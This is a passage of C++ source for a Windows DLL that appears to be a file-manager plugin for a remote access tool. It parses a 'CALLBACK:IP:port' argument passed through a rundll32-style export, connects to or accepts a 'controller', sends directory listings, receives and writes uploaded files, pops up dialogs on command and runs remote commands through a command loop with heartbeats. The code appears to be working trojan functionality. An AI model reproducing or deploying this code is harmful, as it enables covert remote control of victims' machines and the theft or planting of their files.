            WSACleanup();
            return 1;
        }

        int opt = 1;
        setsockopt(g_fm_serverSocket, SOL_SOCKET, SO_REUSEADDR,
            (char*)&opt, sizeof(opt));

        struct sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(FILEMGR_PORT);

        if (bind(g_fm_serverSocket,
            (struct sockaddr*)&serverAddr,
            sizeof(serverAddr)) == SOCKET_ERROR) {
            FMLog("MAIN ERROR: Bind failed, error=" +
                std::to_string(WSAGetLastError()));
            closesocket(g_fm_serverSocket);
            WSACleanup();
            return 1;
        }

        if (listen(g_fm_serverSocket, 1) == SOCKET_ERROR) {
            FMLog("MAIN ERROR: Listen failed");
            closesocket(g_fm_serverSocket);
            WSACleanup();
            return 1;
        }

        DWORD timeout = 45000;
        setsockopt(g_fm_serverSocket, SOL_SOCKET, SO_RCVTIMEO,
            (char*)&timeout, sizeof(timeout));

        struct sockaddr_in clientAddr;
        int clientAddrLen = sizeof(clientAddr);

        g_fm_clientSocket = accept(g_fm_serverSocket,
            (struct sockaddr*)&clientAddr,
            &clientAddrLen);
        if (g_fm_clientSocket == INVALID_SOCKET) {
            FMLog("MAIN ERROR: Accept failed");
            closesocket(g_fm_serverSocket);
            WSACleanup();
            return 1;
        }

        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(clientAddr.sin_addr), clientIP, INET_ADDRSTRLEN);
        g_controller_ip = std::string(clientIP);
        FMLog("MAIN: Client connected from " + g_controller_ip);
    }

    g_debugLogger.Start(g_controller_ip);

    int flag = 1;
    setsockopt(g_fm_clientSocket, IPPROTO_TCP, TCP_NODELAY,
        (char*)&flag, sizeof(flag));

    int keepAlive = 1;
    setsockopt(g_fm_clientSocket, SOL_SOCKET, SO_KEEPALIVE,
        (char*)&keepAlive, sizeof(keepAlive));

    DWORD keepAliveTime = 30000;
    DWORD keepAliveInterval = 5000;
    setsockopt(g_fm_clientSocket, IPPROTO_TCP, TCP_KEEPIDLE,
        (char*)&keepAliveTime, sizeof(keepAliveTime));
    setsockopt(g_fm_clientSocket, IPPROTO_TCP, TCP_KEEPINTVL,
        (char*)&keepAliveInterval, sizeof(keepAliveInterval));

    g_fm_session_active = true;
    g_fm_last_heartbeat = GetTickCount();

    g_current_dir = GetCurrentDirectory();
    FMLog("MAIN: Starting directory=" + g_current_dir);

    std::string initialListing = ListDirectory(g_current_dir);
    SendFMPacket(FM_DIR_LISTING, initialListing);

    g_fm_heartbeatThread = CreateThread(NULL, 0, FMHeartbeatThread,
        NULL, 0, NULL);

    DWORD recvTimeout = 5000;
    setsockopt(g_fm_clientSocket, SOL_SOCKET, SO_RCVTIMEO,
        (char*)&recvTimeout, sizeof(recvTimeout));

    FMLog("MAIN: Entering command loop");

    while (g_fm_running && !g_fm_stop_requested && g_fm_session_active) {
        uint8_t header[5];
        int received = recv(g_fm_clientSocket, (char*)header, 5, MSG_WAITALL);

        if (received == 5) {
            FMPacketType type = (FMPacketType)header[0];
            uint32_t size = ntohl(*(uint32_t*)(&header[1]));

            FMLog("RECV: Type=" + std::to_string(type) +
                " Size=" + std::to_string(size));

            if (type == FM_HEARTBEAT_ACK) {
                g_fm_last_heartbeat = GetTickCount();
                FMLog("RECV: Heartbeat ACK");
                continue;
            }

            if (type == FM_MESSAGE && size > 0 && size < 8192) {
                std::vector<char> msgBuffer(size + 1, 0);
                received = recv(g_fm_clientSocket, msgBuffer.data(),
                    size, MSG_WAITALL);
                if (received == (int)size) {
                    std::string msgData(msgBuffer.data(), size);
                    FMLog("MESSAGE: Received: " + msgData);

                    size_t fp = msgData.find('|');
                    size_t sp = msgData.find('|', fp + 1);
                    if (fp != std::string::npos && sp != std::string::npos) {
                        std::string title = msgData.substr(0, fp);
                        std::string message = msgData.substr(fp + 1, sp - fp - 1);
                        std::string buttons = msgData.substr(sp + 1);
                        if (!ShowMessageDialog(title, message, buttons))
                            SendFMPacket(FM_ERROR, "ERROR: Failed to show dialog");
                    }
                    else {
                        SendFMPacket(FM_ERROR, "ERROR: Invalid message format");
                    }
                }
                continue;
            }

            if (type == FM_FILE_DATA) {
                if (g_receiving_download && size > 0) {
                    std::vector<char> chunk(size);
                    int totalReceived = 0;
                    while (totalReceived < (int)size) {
                        int r = recv(g_fm_clientSocket,
                            chunk.data() + totalReceived,
                            size - totalReceived, 0);
                        if (r <= 0) {
                            g_receiving_download = false;
                            if (g_download_file.is_open())
                                g_download_file.close();
                            SendFMPacket(FM_ERROR,
                                "ERROR: Download interrupted — reconnect to resume");
                            break;
                        }
                        totalReceived += r;
                    }
                    if (totalReceived == (int)size && g_receiving_download) {
                        std::lock_guard<std::mutex> lock(g_download_mutex);
                        g_download_file.write(chunk.data(), size);
                        g_download_file.flush();
                        g_download_bytes_received += size;

                        uint64_t rcvd = g_download_bytes_received.load();
                        uint64_t expected = g_download_expected_size.load();

                        if (rcvd >= expected) {
                            g_download_file.close();
                            g_receiving_download = false;
                            std::string finalPath = g_current_dir + "\\" +
                                g_download_filename;
                            MoveFileExA(g_download_part_path.c_str(),
                                finalPath.c_str(),
                                MOVEFILE_REPLACE_EXISTING);
                            FMLog("DOWNLOAD: Complete — saved to " + finalPath);
                            SendFMPacket(FM_RESPONSE,
                                "OK:File received: " + g_download_filename);
                            SendFMPacket(FM_DIR_LISTING,
                                ListDirectory(g_current_dir));
                        }
                    }
                }
                else if (!g_receiving_download && size > 0) {
                    std::vector<char> discard(size);
                    recv(g_fm_clientSocket, discard.data(), size, MSG_WAITALL);
                }
                continue;
            }

            if (type == FM_COMMAND && size > 0 && size < 8192) {
                std::vector<char> cmdBuffer(size + 1, 0);
                received = recv(g_fm_clientSocket, cmdBuffer.data(),
                    size, MSG_WAITALL);
                if (received == (int)size) {
                    std::string cmd(cmdBuffer.data(), size);
                    ProcessCommand(cmd);
                }
            }
        }
        else if (received == 0) {
            FMLog("RECV: Client disconnected");
            break;
        }
        else if (received == SOCKET_ERROR) {
            int error = WSAGetLastError();
            if (error != WSAETIMEDOUT && error != WSAEWOULDBLOCK) {
                FMLog("RECV ERROR: Socket error=" + std::to_string(error));
                break;
            }
        }
    }

    FMLog("MAIN: Cleanup started");
    g_fm_session_active = false;

    if (g_fm_heartbeatThread) {
        WaitForSingleObject(g_fm_heartbeatThread, 2000);
        CloseHandle(g_fm_heartbeatThread);
        g_fm_heartbeatThread = nullptr;
    }
    if (g_fm_clientSocket != INVALID_SOCKET) {
        shutdown(g_fm_clientSocket, SD_BOTH);
        closesocket(g_fm_clientSocket);
        g_fm_clientSocket = INVALID_SOCKET;
    }
    if (g_fm_serverSocket != INVALID_SOCKET) {
        closesocket(g_fm_serverSocket);
        g_fm_serverSocket = INVALID_SOCKET;
    }

    g_debugLogger.Stop();
    WSACleanup();
    FMLog("MAIN: Thread ended");
    return 0;
}

static void ParseCallbackParam(const std::string& cmdLine) {

    std::string s = cmdLine;

    size_t start = s.find_first_not_of(" \t");
    if (start != std::string::npos) s = s.substr(start);

    if (!s.empty() && s[0] == '|') s = s.substr(1);

    const std::string prefix = "CALLBACK:";
    if (s.find(prefix) != 0) {
        FMLog("ParseCallbackParam: no CALLBACK prefix found in: " + cmdLine);
        return;
    }

    std::string addrPart = s.substr(prefix.size()); 
    size_t colonPos = addrPart.rfind(':');
    if (colonPos == std::string::npos) {
        FMLog("ParseCallbackParam: no colon in address: " + addrPart);
        return;
    }

    g_callback_ip = addrPart.substr(0, colonPos);
    g_callback_port = std::stoi(addrPart.substr(colonPos + 1));

    FMLog("ParseCallbackParam: IP=" + g_callback_ip +
        " Port=" + std::to_string(g_callback_port));
}

extern "C" __declspec(dllexport) void ModuleMain() {
    g_fm_running = true;
    g_fm_stop_requested = false;
    g_fm_mainThread = CreateThread(NULL, 0, FMMainThread, NULL, 0, NULL);
}

extern "C" __declspec(dllexport)
void CALLBACK StartRoutine(HWND hwnd, HINSTANCE hinst,
    LPSTR lpszCmdLine, int nCmdShow) {
    FMLog("StartRoutine called");
    FMLog("lpszCmdLine: " + std::string(lpszCmdLine ? lpszCmdLine : "(null)"));

    if (lpszCmdLine && strlen(lpszCmdLine) > 0) {
        ParseCallbackParam(std::string(lpszCmdLine));
    }
    ModuleMain();
    if (g_fm_mainThread) {
        WaitForSingleObject(g_fm_mainThread, INFINITE);
        CloseHandle(g_fm_mainThread);
        g_fm_mainThread = nullptr;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        break;
    case DLL_PROCESS_DETACH:
        g_fm_running = false;
        g_fm_stop_requested = true;
        g_fm_session_active = false;
        g_debugLogger.Stop();
        break;
    }
    return TRUE;
}